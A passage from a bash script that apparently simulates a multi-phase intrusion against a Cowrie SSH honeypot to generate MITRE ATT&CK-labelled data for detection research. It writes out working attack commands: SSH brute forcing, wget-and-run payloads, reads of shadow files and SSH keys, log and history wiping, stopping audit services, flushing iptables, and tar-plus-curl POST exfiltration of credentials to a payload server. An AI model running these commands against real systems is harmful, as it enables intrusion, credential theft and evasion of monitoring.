# logins AND ≥3 distinct usernames) — so the claim is checkable, not assumed.
# =============================================================================
if [ "$SKIP_BRUTE" -eq 0 ] && ([ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "2" ]); then

log_phase "Phase 2: Brute Force  [T1110]"
log "Attempting credential stuffing: ${USERS_COUNT} usernames × ${#PASSWORDS[@]} passwords = $((USERS_COUNT * ${#PASSWORDS[@]})) attempts"
log "Triggers: T1110 (Brute Force) — threshold: 5+ failures, 3+ distinct usernames"

declare -A USER_ATTEMPT_COUNT

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    if sshpass -p "$pass" ssh $SSH_OPTS "${user}@${HONEYPOT_IP}" "exit" 2>/dev/null; then
      SUCCESS_LOGINS=$((SUCCESS_LOGINS + 1))
    else
      FAILED_LOGINS=$((FAILED_LOGINS + 1))
    fi
    USER_ATTEMPT_COUNT["$user"]=$(( ${USER_ATTEMPT_COUNT["$user"]:-0} + 1 ))
    BRUTE_ATTEMPTS=$((BRUTE_ATTEMPTS + 1))
    [ "$QUIET" -eq 0 ] && printf "  [Brute] Attempt %3d — %s:%s\r" "$BRUTE_ATTEMPTS" "$user" "$pass"
    sleep 0.1
  done
done
echo ""

DISTINCT_USERNAMES=${#USER_ATTEMPT_COUNT[@]}

log "Phase 2 complete: ${BRUTE_ATTEMPTS} attempts across ${DISTINCT_USERNAMES} usernames ✓"
log ""
log "── T1110 Brute Force Validation ──────────────────────────────"
# ttp_extract.py's real T1110 rule (Step 1.5, cross-session correlation) does
# NOT count failed logins — Cowrie deliberately accepts most passwords, so
# "failed logins" is the wrong yardstick and made this self-check wrongly
# predict FAIL while the real detector correctly flagged every session. The
# real rule counts NO-COMMAND probe sessions from one source IP (a session
# whose only command is a bare `exit`, or none): >= BRUTE_FORCE_THRESHOLD (5)
# such sessions AND >= BRUTE_FORCE_MIN_DISTINCT_USERNAMES (3) distinct
# usernames. Every attempt in this phase is exactly such a session
# (`ssh ... "exit"`), so BRUTE_ATTEMPTS is the count that matters here,
# regardless of how many were reported "successful".
log "  Total attempts:        ${BRUTE_ATTEMPTS}"
log "  No-command sessions:   ${BRUTE_ATTEMPTS}   (each attempt is an 'exit'-only session — ttp_extract.py threshold: ≥5)"
log "  Distinct usernames:    ${DISTINCT_USERNAMES}   (ttp_extract.py threshold: ≥3)"
log "  (failed=${FAILED_LOGINS}, success=${SUCCESS_LOGINS} — shown for reference only; NOT what the real detector uses)"
if [ "$BRUTE_ATTEMPTS" -ge 5 ] && [ "$DISTINCT_USERNAMES" -ge 3 ]; then
  log "  Result: PASS — ttp_extract.py WILL flag these sessions as T1110"
  log "  (matches the real cross-session correlation rule: ≥5 no-command sessions, ≥3 usernames)"
else
  log "  Result: FAIL — fewer than 5 no-command sessions or fewer than 3 usernames;"
  log "  ttp_extract.py will NOT flag T1110. Increase USERS/PASSWORDS to cross the threshold."
fi
log "────────────────────────────────────────────────────────────"

fi # end Phase 2

# =============================================================================
# PHASE 3 — INGRESS TOOL TRANSFER + EXECUTION
# MITRE T1105: Ingress Tool Transfer  (wget from HTTP server)
# MITRE T1204: User Execution         (chmod +x + execute payload)
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "3" ]; then

log_phase "Phase 3: Tool Transfer + Execution  [T1105 · T1204]"

if verify_payload_reachable; then
  PHASE3_RAN=1
  log "Downloading and executing payload from ${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}"
  log "Triggers: T1105 (wget download) · T1204 (chmod +x + execute)"
  log "Note: payload is a harmless echo script — no real malicious action"

  for i in {1..10}; do
    ssh_cmd "root" "password123" "
wget -q http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE} -O /tmp/${PAYLOAD_FILE}
chmod +x /tmp/${PAYLOAD_FILE}
/tmp/${PAYLOAD_FILE}
rm -f /tmp/${PAYLOAD_FILE}
exit
" >/dev/null
    EXEC_SESSIONS=$((EXEC_SESSIONS + 1))
    [ "$QUIET" -eq 0 ] && printf "  [Exec] Session %2d/10 complete\r" "$i"
    sleep 0.3
  done
  echo ""
  log "Phase 3 complete: ${EXEC_SESSIONS} execution sessions ✓"
  log "  → T1105 (Ingress Tool Transfer) triggered: wget download"
  log "  → T1204 (User Execution) triggered: chmod +x + execute"
else
  log "Phase 3 SKIPPED — payload server unreachable from honeypot session"
fi

fi # end Phase 3

# =============================================================================
# PHASE 4 — LATERAL MOVEMENT (extended recon post-compromise)
# MITRE T1082, T1049, T1057
#
# Phases 4-9 are defined as functions so their order can be shuffled by
# --shuffle-mid (see Main, below) — real attackers don't always enumerate
# processes before scanning, or check creds before privesc, and training
# the LSTM on only one fixed canonical order was contributing to the
# synthetic-vs-real data imbalance discussed in COMMANDS.md.
# =============================================================================
phase4() {

log_phase "Phase 4: Post-Compromise Enumeration  [T1082 · T1049 · T1057]"
log "Simulating attacker behaviour after initial access"

for i in {1..5}; do
  ssh_cmd "root" "password123" '
ps aux
netstat -an 2>/dev/null || ss -an
ifconfig 2>/dev/null || ip addr
cat /etc/shadow 2>/dev/null || echo "shadow not readable"
find / -name "*.conf" -maxdepth 3 2>/dev/null | head -10
exit
' >/dev/null
  [ "$QUIET" -eq 0 ] && printf "  [Post] Session %2d/5 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 4 complete: 5 post-compromise sessions ✓"
log "  → T1049 (Network Connections) triggered: netstat/ss"
log "  → T1057 (Process Discovery) triggered: ps aux"

} # end phase4

# =============================================================================
# PHASE 5 — NETWORK SERVICE SCANNING
# MITRE T1046: Network Service Scanning
#
# Attacker probes for other reachable services from the compromised host.
# Uses nmap if present inside the honeypot's filesystem, falling back to a
# plain /dev/tcp port sweep (pure bash, no extra tooling needed) — either
# way Cowrie records the exact commands typed, which is what ttp_extract.py
# keys off of.
# =============================================================================
phase5() {

log_phase "Phase 5: Network Service Scanning  [T1046]"
log "Probing for other reachable services from the compromised host (3 sessions)"
log "Triggers: T1046 (nmap / port sweep against the local subnet)"

for i in {1..3}; do
  ssh_cmd "root" "password123" '
which nmap >/dev/null 2>&1 && nmap -sT -p 22,80,443,3306,8080 127.0.0.1 2>/dev/null || {
  echo "[scan] nmap not available — falling back to a manual TCP sweep"
  for p in 22 80 443 3306 8080; do
    timeout 1 bash -c "echo > /dev/tcp/127.0.0.1/$p" 2>/dev/null \
      && echo "[scan] port $p: open" || echo "[scan] port $p: closed/filtered"
  done
}
exit
' >/dev/null
  SCAN_SESSIONS=$((SCAN_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Scan] Session %2d/3 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 5 complete: ${SCAN_SESSIONS} scanning sessions ✓"
log "  → T1046 (Network Service Scanning) triggered: nmap / port sweep"

} # end phase5

# =============================================================================
# PHASE 6 — PRIVILEGE ESCALATION ENUMERATION
# MITRE T1548: Abuse Elevation Control Mechanism
# =============================================================================
phase6() {

log_phase "Phase 6: Privilege Escalation Enumeration  [T1548]"
log "Checking for escalation paths: sudo rights, SUID binaries (3 sessions)"
log "Triggers: T1548 (sudo -l, find -perm -4000)"

for i in {1..3}; do
  ssh_cmd "root" "password123" '
sudo -l 2>/dev/null || echo "sudo -l: not permitted or not available"
find / -perm -4000 -type f 2>/dev/null | head -15
cat /etc/sudoers 2>/dev/null || echo "/etc/sudoers not readable"
ls -la /etc/sudoers.d/ 2>/dev/null || true
exit
' >/dev/null
  PRIVESC_SESSIONS=$((PRIVESC_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [PrivEsc] Session %2d/3 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 6 complete: ${PRIVESC_SESSIONS} privilege-escalation-recon sessions ✓"
log "  → T1548 (Abuse Elevation Control) triggered: sudo -l, SUID search, sudoers read"

} # end phase6

# =============================================================================
# PHASE 7 — UNSECURED CREDENTIALS DISCOVERY
# MITRE T1552: Unsecured Credentials
# =============================================================================
phase7() {

log_phase "Phase 7: Unsecured Credentials Discovery  [T1552]"
log "Searching for keys, configs, and credential files (3 sessions)"
log "Triggers: T1552 (searching for id_rsa, .pem, config files with passwords)"

for i in {1..3}; do
  ssh_cmd "root" "password123" '
find / -iname "id_rsa" -o -iname "*.pem" -o -iname "*.key" 2>/dev/null | head -10
cat ~/.ssh/id_rsa 2>/dev/null || echo "no id_rsa in ~/.ssh"
cat ~/.bash_history 2>/dev/null | grep -i "pass\|token\|key" | head -5 || true
grep -ril "password" /etc 2>/dev/null | head -5 || true
find / -iname "*.env" -o -iname "credentials*" 2>/dev/null | head -5
exit
' >/dev/null
  CREDS_SESSIONS=$((CREDS_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Creds] Session %2d/3 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 7 complete: ${CREDS_SESSIONS} credential-discovery sessions ✓"
log "  → T1552 (Unsecured Credentials) triggered: key/config/history search"

} # end phase7

# =============================================================================
# PHASE 8 — REMOTE SERVICES (LATERAL MOVEMENT ATTEMPT)
# MITRE T1021: Remote Services
#
# Attempts an outbound SSH hop from the compromised host to other addresses
# on the local subnet. These targets don't exist, so the attempts simply
# time out fast (ConnectTimeout=2) — what matters for MITRE classification
# is that the *attempt* (the ssh command itself) is what gets recorded, not
# whether it succeeds.
# =============================================================================
phase8() {

log_phase "Phase 8: Remote Services — Lateral Movement Attempt  [T1021]"
log "Attempting outbound SSH to other hosts on the local subnet (2 attempts)"
log "Triggers: T1021 (ssh to other local IPs from inside the compromised host)"

for target in "192.168.1.50" "192.168.1.51"; do
  ssh_cmd "root" "password123" "
ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@${target} 'whoami' 2>&1 | head -3
exit
" >/dev/null
  LATERAL_ATTEMPTS=$((LATERAL_ATTEMPTS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Lateral] Attempt %d/2 (target %s) complete\r" "$LATERAL_ATTEMPTS" "$target"
  sleep 0.3
done
echo ""
log "Phase 8 complete: ${LATERAL_ATTEMPTS} lateral-movement attempts ✓"
log "  → T1021 (Remote Services) triggered: outbound ssh from compromised host"

} # end phase8

# =============================================================================
# PHASE 9 — INDICATOR REMOVAL
# MITRE T1070: Indicator Removal
# =============================================================================
phase9() {

log_phase "Phase 9: Indicator Removal  [T1070]"
log "Attempting to clear command history and cover tracks (3 sessions)"
log "Triggers: T1070 (history -c, > .bash_history, log timestamp tampering)"

for i in {1..3}; do
  ssh_cmd "root" "password123" '
history -c 2>/dev/null || true
cat /dev/null > ~/.bash_history 2>/dev/null || echo "could not clear .bash_history"
unset HISTFILE
touch -d "2020-01-01" /tmp/cs_payload 2>/dev/null || true
rm -f /var/log/auth.log 2>/dev/null || echo "auth.log not removable (expected on a real system)"
exit
' >/dev/null
  INDICATOR_SESSIONS=$((INDICATOR_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Cover] Session %2d/3 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 9 complete: ${INDICATOR_SESSIONS} indicator-removal sessions ✓"
log "  → T1070 (Indicator Removal) triggered: history clearing, log deletion attempt"

} # end phase9

# =============================================================================
# Dispatch phases 4-9 — fixed order by default, shuffled with --shuffle-mid.
# Phases 1-3 (entry) already ran above; Phases 10-13 (impact / persistence /
# exfil) run in fixed order below, after this block.
# =============================================================================
MID_PHASES=(4 5 6 7 8 9)
if [ "$SHUFFLE_MID" -eq 1 ] && [ -z "$ONLY_PHASE" ]; then
  for ((i=${#MID_PHASES[@]}-1; i>0; i--)); do
    j=$((RANDOM % (i+1)))
    tmp="${MID_PHASES[i]}"; MID_PHASES[i]="${MID_PHASES[j]}"; MID_PHASES[j]="$tmp"
  done
  log "Phase order for 4-9 (shuffled via --shuffle-mid): ${MID_PHASES[*]}"
fi

for _p in "${MID_PHASES[@]}"; do
  if [ -n "$ONLY_PHASE" ] && [ "$ONLY_PHASE" != "$_p" ]; then
    continue
  fi
  case "$_p" in
    4) phase4 ;;
    5) phase5 ;;
    6) phase6 ;;
    7) phase7 ;;
    8) phase8 ;;
    9) phase9 ;;
  esac
done

# =============================================================================
# PHASE 10 — DENIAL OF SERVICE (CONNECTION FLOOD)
# MITRE T1499: Endpoint Denial of Service
#
# Rapid burst of TCP connect/disconnect against the honeypot's own SSH port.
# Deliberately bounded (default 50 connections) — this is a *demonstration*
# of the connection-flood pattern for MITRE classification, not an attempt
# to actually overwhelm anything. Raise DOS_CONNECTIONS if you want more
# signal in the resulting session data, but keep it sane on shared hardware.
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "10" ]; then

log_phase "Phase 10: Denial of Service — Connection Flood  [T1499]"
DOS_TARGET_COUNT="${DOS_CONNECTIONS_TARGET:-50}"
log "Sending ${DOS_TARGET_COUNT} rapid TCP connect/disconnects at the honeypot's SSH port"
log "Triggers: T1499 (Endpoint DoS) — bounded/safe demonstration, not a real flood"

for ((i=1; i<=DOS_TARGET_COUNT; i++)); do
  timeout 1 bash -c "echo > /dev/tcp/${HONEYPOT_IP}/${HONEYPOT_PORT}" 2>/dev/null
  DOS_CONNECTIONS=$((DOS_CONNECTIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [DoS] Connection %3d/%d\r" "$DOS_CONNECTIONS" "$DOS_TARGET_COUNT"
done
echo ""
log "Phase 10 complete: ${DOS_CONNECTIONS} rapid connections sent ✓"
log "  → T1499 (Endpoint Denial of Service) triggered: connection flood pattern"

fi # end Phase 10

# =============================================================================
# PHASE 11 — SERVICE STOP (IMPACT)
# MITRE T1489: Service Stop
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "11" ]; then

log_phase "Phase 11: Service Stop  [T1489]"
log "Attempting to stop security/monitoring services (3 sessions)"
log "Triggers: T1489 (systemctl/service stop against auditd, rsyslog; iptables -F)"

for i in {1..3}; do
  ssh_cmd "root" "password123" '
systemctl stop auditd 2>/dev/null || service auditd stop 2>/dev/null || echo "auditd stop: not available"
systemctl stop rsyslog 2>/dev/null || service rsyslog stop 2>/dev/null || echo "rsyslog stop: not available"
pkill -f auditd 2>/dev/null || true
iptables -F 2>/dev/null || echo "iptables -F: not permitted"
exit
' >/dev/null
  SERVICE_STOP_SESSIONS=$((SERVICE_STOP_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Impact] Session %2d/3 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 11 complete: ${SERVICE_STOP_SESSIONS} service-stop sessions ✓"
log "  → T1489 (Service Stop) triggered: attempted kill of security services"

fi # end Phase 11

# =============================================================================
# PHASE 12 — VALID ACCOUNTS (persistence / return access)
# MITRE T1078: Valid Accounts
#
# Simulates an attacker coming back later and logging straight in with a
# credential already confirmed to work in Phase 2, instead of re-running
# the noisy multi-attempt brute-force pattern. A single clean login +
# a short check-in, tagged with a marker string so ttp_extract.py's T1078
# rule can key off content rather than an easily-confused heuristic like
# "1 login attempt" (Phase 1's recon sessions also do exactly one clean
# login, so a marker avoids that collision).
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "12" ]; then

log_phase "Phase 12: Valid Accounts — Return Access  [T1078]"
log "Re-authenticating with a credential already confirmed to work (2 sessions)"
log "Triggers: T1078 (single clean login + check-in, marked cs_valid_account_reentry)"

for i in {1..2}; do
  ssh_cmd "root" "password123" '
echo "cs_valid_account_reentry: returning with known-good credential"
id
date
exit
' >/dev/null
  PERSIST_SESSIONS=$((PERSIST_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Persist] Session %d/2 complete\r" "$PERSIST_SESSIONS"
  sleep 0.3
done
echo ""
log "Phase 12 complete: ${PERSIST_SESSIONS} return-access sessions ✓"
log "  → T1078 (Valid Accounts) triggered: clean re-entry with known-good credential"

fi # end Phase 12

# =============================================================================
# PHASE 13 — DATA COLLECTION + EXFILTRATION
# MITRE T1005: Data from Local System
# MITRE T1041: Exfiltration Over C2 Channel
#
# Packages files that Phase 7 already found interesting (SSH keys, passwd)
# and POSTs the archive to the "payload" container's /upload endpoint —
# reusing the same container Phase 3 downloads from, now playing the role
# of an exfil drop point. What matters for MITRE classification is the
# collection + outbound-POST command PATTERN, same philosophy as Phase 8's
# lateral movement: the attempt is what's recorded, whether or not the
# receiving end does anything meaningful with the data (it does here — see
# payload_server.py — but that's incidental to the classification).
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "13" ]; then

log_phase "Phase 13: Data Collection + Exfiltration  [T1005 · T1041]"
log "Archiving discovered credentials/config and POSTing to the payload container (2 sessions)"
log "Triggers: T1005 (tar collection) · T1041 (curl POST exfil)"

for i in {1..2}; do
  ssh_cmd "root" "password123" "
tar czf /tmp/cs_loot.tar.gz /etc/passwd \$HOME/.ssh 2>/dev/null
curl -s -X POST -F \"file=@/tmp/cs_loot.tar.gz\" http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/upload 2>/dev/null || echo 'exfil POST failed (expected if payload container unreachable)'
rm -f /tmp/cs_loot.tar.gz
exit
" >/dev/null
  EXFIL_SESSIONS=$((EXFIL_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Exfil] Session %d/2 complete\r" "$EXFIL_SESSIONS"
  sleep 0.3
done
echo ""
log "Phase 13 complete: ${EXFIL_SESSIONS} collection+exfil sessions ✓"
log "  → T1005 (Data from Local System) triggered: tar czf"
log "  → T1041 (Exfiltration Over C2 Channel) triggered: curl -X POST"

fi # end Phase 13

# =============================================================================
# END OF SIMULATION — SUMMARY
# =============================================================================
echo ""
echo "================================================================"
echo "  ATTACK SIMULATION COMPLETE"
echo "================================================================"
echo ""
printf "  %-30s %s\n" "Reconnaissance sessions:"  "${RECON_SESSIONS}"
printf "  %-30s %s\n" "Brute force attempts:"     "${BRUTE_ATTEMPTS}"
printf "  %-30s %s\n" "  – failed logins:"        "${FAILED_LOGINS}"
printf "  %-30s %s\n" "  – successful logins:"    "${SUCCESS_LOGINS}"
printf "  %-30s %s\n" "  – distinct usernames:"   "${DISTINCT_USERNAMES}"
printf "  %-30s %s\n" "Execution sessions:"        "${EXEC_SESSIONS}"
printf "  %-30s %s\n" "Scan sessions:"             "${SCAN_SESSIONS}"
printf "  %-30s %s\n" "Priv-esc recon sessions:"   "${PRIVESC_SESSIONS}"
printf "  %-30s %s\n" "Credential search sessions:" "${CREDS_SESSIONS}"
printf "  %-30s %s\n" "Lateral movement attempts:" "${LATERAL_ATTEMPTS}"
printf "  %-30s %s\n" "Indicator removal sessions:" "${INDICATOR_SESSIONS}"
printf "  %-30s %s\n" "DoS connections sent:"      "${DOS_CONNECTIONS}"
printf "  %-30s %s\n" "Service-stop sessions:"     "${SERVICE_STOP_SESSIONS}"
printf "  %-30s %s\n" "Return-access sessions:"    "${PERSIST_SESSIONS}"
printf "  %-30s %s\n" "Collection+exfil sessions:" "${EXFIL_SESSIONS}"
if [ "$SHUFFLE_MID" -eq 1 ]; then
  printf "  %-30s %s\n" "Mid-phase order used:" "${MID_PHASES[*]}"
fi
if [ "${CAPTURE_PID:-0}" -gt 0 ]; then
  printf "  %-30s %s\n" "Packet capture:" "${PCAP_FILE}"
fi
echo ""
echo "  MITRE ATT&CK techniques generated:"
echo "    T1110  Brute Force               ← ${BRUTE_ATTEMPTS} attempts (${FAILED_LOGINS} failed), ${DISTINCT_USERNAMES} usernames"
echo "    T1082  System Info Discovery     ← uname, /etc/issue, hostname"
echo "    T1087  Account Discovery         ← whoami, id, /etc/passwd"
if [ "$PHASE3_RAN" -eq 1 ]; then
  echo "    T1105  Ingress Tool Transfer     ← wget from ${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}"
  echo "    T1204  User Execution            ← chmod +x + execute payload"
else
  echo "    T1105/T1204                      ← SKIPPED this run (payload server unreachable)"
fi
echo "    T1049  Network Connections       ← netstat/ss"
echo "    T1057  Process Discovery         ← ps aux"
echo "    T1046  Network Service Scanning  ← ${SCAN_SESSIONS} sessions, nmap/port sweep"
echo "    T1548  Abuse Elevation Control   ← ${PRIVESC_SESSIONS} sessions, sudo -l + SUID search"
echo "    T1552  Unsecured Credentials     ← ${CREDS_SESSIONS} sessions, key/config search"
echo "    T1021  Remote Services           ← ${LATERAL_ATTEMPTS} lateral SSH attempts"
echo "    T1070  Indicator Removal         ← ${INDICATOR_SESSIONS} sessions, history/log clearing"
echo "    T1499  Endpoint DoS              ← ${DOS_CONNECTIONS} rapid connections"
echo "    T1489  Service Stop              ← ${SERVICE_STOP_SESSIONS} sessions, auditd/rsyslog/iptables"
echo "    T1078  Valid Accounts            ← ${PERSIST_SESSIONS} sessions, clean re-entry"
echo "    T1005  Data from Local System    ← ${EXFIL_SESSIONS} sessions, tar collection"
echo "    T1041  Exfiltration Over C2      ← ${EXFIL_SESSIONS} sessions, curl POST to payload container"
echo ""
echo "  Next steps:"
echo "    docker cp honeypot-cowrie-1:/cowrie/cowrie-git/var/log/cowrie/cowrie.json \\"
echo "        cowrie-raw.json"
echo "    ./run_pipeline.sh"
echo ""
echo "================================================================"

{
  echo ""
  echo "=== Simulation Summary: $(date '+%Y-%m-%d %H:%M:%S') ==="
  echo "Recon sessions:      ${RECON_SESSIONS}"
  echo "Brute attempts:      ${BRUTE_ATTEMPTS} (failed: ${FAILED_LOGINS}, success: ${SUCCESS_LOGINS}, usernames: ${DISTINCT_USERNAMES})"
  echo "Exec sessions:       ${EXEC_SESSIONS}"
  echo "Scan sessions:       ${SCAN_SESSIONS}"
  echo "PrivEsc sessions:    ${PRIVESC_SESSIONS}"
  echo "Creds sessions:      ${CREDS_SESSIONS}"
  echo "Lateral attempts:    ${LATERAL_ATTEMPTS}"
  echo "Indicator removal:   ${INDICATOR_SESSIONS}"
  echo "DoS connections:     ${DOS_CONNECTIONS}"
  echo "Service stop:        ${SERVICE_STOP_SESSIONS}"
  echo "Return access:       ${PERSIST_SESSIONS}"
  echo "Collection+exfil:    ${EXFIL_SESSIONS}"
  echo "Mid-phase order:     ${MID_PHASES[*]:-1 2 3 (fixed, --shuffle-mid not used)}"
  echo "Packet capture:      ${PCAP_FILE:-none}"
} >> "$LOG_FILE"
